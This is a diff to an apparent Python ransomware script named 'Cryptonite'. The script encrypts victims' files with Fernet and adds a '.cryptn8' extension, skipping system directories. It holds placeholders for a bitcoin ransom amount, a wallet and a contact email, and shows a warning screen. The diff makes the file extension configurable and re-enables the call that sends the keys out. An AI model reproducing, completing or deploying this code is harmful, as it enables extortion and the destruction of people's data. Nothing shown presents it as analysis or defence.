@@ -21,6 +21,7 @@ print(dkrpt)
 BTC_AMOUNT = 0.03                                       # <----  REQUIRED
 BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
 EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
+EXT = ".cryptn8"                                        # <----  OPTIONAL
 
 EXCLUDED_DIRS = [   "/Windows",
                     "/Program Files",
@@ -29,7 +30,7 @@ EXCLUDED_DIRS = [   "/Windows",
                 ]
 
 fileLists = []      # stores the files to be encrypted
-fileList = [] 
+fileList = []       # stores the files to be decrypted
 
 
 class Cryptonite():
@@ -40,7 +41,7 @@ class Cryptonite():
         self.decryptPlease = dkrpt
         self.uniqueKey = uniqKey
 
-              # stores the files to be decrypted
+              
 
 
     def sendKeys(self):
@@ -65,7 +66,7 @@ class Cryptonite():
         
         for file in tqdm.tqdm(fileLists):
             flag = 0
-            newfile = str(file)+".cryptn8"
+            newfile = str(file)+EXT
             try:
                 with open(file, "rb") as f:
                     data = f.read()
@@ -109,16 +110,16 @@ class Cryptonite():
         for files in fileList:
             flag = 0
             try:
-                with open(str(files)+".cryptn8", "rb") as f:
+                with open(str(files)+EXT, "rb") as f:
                     data = f.read()
             except:
                 flag = 1
             if flag == 0:
                 try:
-                    with open(str(files)+".cryptn8", "wb") as f:
+                    with open(str(files)+EXT, "wb") as f:
                         decryptedData = self.fernetEncrypt.decrypt(data)
                         f.write(decryptedData)
-                    os.rename(str(files)+".cryptn8", files)
+                    os.rename(str(files)+EXT, files)
                 except:
                     a = "error" # just to fill the except block
 
@@ -150,6 +151,6 @@ if __name__ == "__main__":
     cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
     window = System(key,fe,dkrpt,uniqKey)
 
-    # cryptn8.sendKeys()
+    cryptn8.sendKeys()
     cryptn8.findFiles()
     window.warningScreen()
